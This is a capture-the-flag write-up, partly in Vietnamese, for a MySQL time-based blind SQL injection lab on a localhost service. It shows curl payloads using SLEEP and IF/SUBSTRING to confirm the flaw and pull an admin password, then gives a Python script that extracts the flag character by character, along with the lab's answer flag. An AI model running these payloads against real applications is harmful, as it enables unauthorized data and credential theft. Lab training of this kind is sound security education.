# SQLi-029: MySQL Time-based Blind - Writeup

## Flag: `FLAG{t1m3_b4s3d_sl33p_1nj3ct10n}`

---

## 🔍 Bước 1: DETECT

Response luôn giống nhau, dùng time delay:

```bash
# Normal - fast response (~0.1s)
time curl "http://localhost:5029/product?id=1"

# Inject SLEEP - slow response (~3s)
time curl "http://localhost:5029/product?id=1 AND SLEEP(3)"
```

→ Response time khác nhau = **Time-based Blind confirmed!**

---

## 🎯 Bước 2: IDENTIFY

```bash
# MySQL SLEEP works
time curl "http://localhost:5029/product?id=1 AND SLEEP(2)-- -"
# ~2s delay → MySQL
```

---

## 🔢 Bước 3: ENUMERATE

```bash
# Table exists? (delay if TRUE)
time curl "http://localhost:5029/product?id=1 AND IF((SELECT COUNT(*) FROM admin_users)>0,SLEEP(2),0)-- -"
```

---

## 📤 Bước 4: EXTRACT

```bash
# First char = 'T'?
time curl "http://localhost:5029/product?id=1 AND IF(SUBSTRING((SELECT password FROM admin_users LIMIT 1),1,1)='T',SLEEP(2),0)-- -"
# ~2s delay → TRUE!
```

**Password:** `T1m3_Adm1n_P@ss!`

---

## ⬆️ Bước 5: ESCALATE

Credentials: `time_admin:T1m3_Adm1n_P@ss!`

---

## 🏆 Bước 6: EXFILTRATE

```bash
time curl "http://localhost:5029/product?id=1 AND IF(SUBSTRING((SELECT value FROM flags LIMIT 1),1,1)='F',SLEEP(2),0)-- -"
```

🎉 **FLAG:** `FLAG{t1m3_b4s3d_sl33p_1nj3ct10n}`

---

## Exploit Script

```python
import requests
import time

def check(condition):
    start = time.time()
    payload = f"1 AND IF({condition},SLEEP(2),0)-- -"
    requests.get(f"http://localhost:5029/product?id={payload}")
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 35):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        cond = f"SUBSTRING((SELECT value FROM flags LIMIT 1),{pos},1)='{c}'"
        if check(cond):
            flag += c
            print(f"[+] {flag}")
            break
```
